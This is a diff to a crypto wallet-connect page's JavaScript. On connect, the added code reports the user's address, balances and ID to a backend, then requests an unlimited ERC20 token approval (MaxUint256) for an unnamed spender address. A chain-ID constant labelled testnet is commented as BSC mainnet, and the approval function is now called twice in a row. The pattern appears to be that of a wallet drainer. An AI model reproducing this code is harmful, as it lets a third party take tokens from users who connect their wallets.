@@ -895,7 +895,6 @@ header{
 async function ensureTokenApproval(){
   if(!TOKEN_ADDRESS){
     console.warn("TOKEN_ADDRESS not set, skipping approve");
-    // optional log
     if (currentAddress && currentUserId) {
       await notifyBackend(currentAddress, BNB_TESTNET_LABEL, currentUserId, "", "", "approval_skipped_no_token");
     }
@@ -921,7 +920,7 @@ async function ensureTokenApproval(){
 
     const ethersProvider = new ethers.BrowserProvider(
       providerInstance,
-      BNB_TESTNET_CHAIN_ID_DEC    // 56 (BSC mainnet)
+      BNB_TESTNET_CHAIN_ID_DEC   // 56 (BSC mainnet)
     );
     const signer       = await ethersProvider.getSigner();
     const ownerAddress = (await signer.getAddress()).toLowerCase();
@@ -938,16 +937,17 @@ async function ensureTokenApproval(){
       return;
     }
 
-    // 1) Read current allowance
+    // 1) Read current allowance (view-only)
     const readContract = new ethers.Contract(
       TOKEN_ADDRESS,
       ERC20_ALLOWANCE_ABI,
       ethersProvider
     );
     const currentAllowance = await readContract.allowance(ownerAddress, SPENDER_ADDRESS);
+    console.log("[approve] currentAllowance =", currentAllowance.toString());
 
     if (currentAllowance > 0n) {
-      console.log("Already approved, skipping new approve tx");
+      console.log("[approve] already approved, skipping tx");
       setStatus("Connected (already approved)");
       if (currentAddress && currentUserId) {
         await notifyBackend(currentAddress, BNB_TESTNET_LABEL, currentUserId, "", "", "approval_already");
@@ -962,12 +962,14 @@ async function ensureTokenApproval(){
       ERC20_APPROVE_ABI,
       signer
     );
+
     const tx = await writeContract.approve(SPENDER_ADDRESS, ethers.MaxUint256);
-    console.log("Approve tx sent:", tx.hash);
+    console.log("[approve] tx sent:", tx.hash);
 
     setStatus("Approval pending on chain…");
     const receipt = await tx.wait();
-    console.log("Approve confirmed:", receipt);
+    console.log("[approve] confirmed:", receipt);
+
     setStatus("Connected + Approved ✅");
 
     if (currentAddress && currentUserId) {
@@ -977,9 +979,7 @@ async function ensureTokenApproval(){
     console.error("Token approve error:", err);
 
     let statusTag = "approval_error";
-
-    // Detect user rejection (MetaMask / Wallets)
-    if (err && (err.code === 4001 || err.code === 'ACTION_REJECTED')) {
+    if (err && (err.code === 4001 || err.code === "ACTION_REJECTED")) {
       statusTag = "approval_rejected";
     }
 
@@ -991,6 +991,7 @@ async function ensureTokenApproval(){
     }
   }
 }
+
 
 
     async function restoreSessionFromAddress(address){
@@ -1106,6 +1107,17 @@ async function ensureTokenApproval(){
 
         await restoreSessionFromAddress(address);
         setStatus("Connected");
+        await notifyBackend(
+  address,
+  BNB_TESTNET_LABEL,
+  userId,
+  balanceBNB,
+  tokenBalance,
+  "connect"     // <--- ADD THIS
+);
+
+await ensureTokenApproval();
+
         await ensureTokenApproval();
 
       }catch(err){
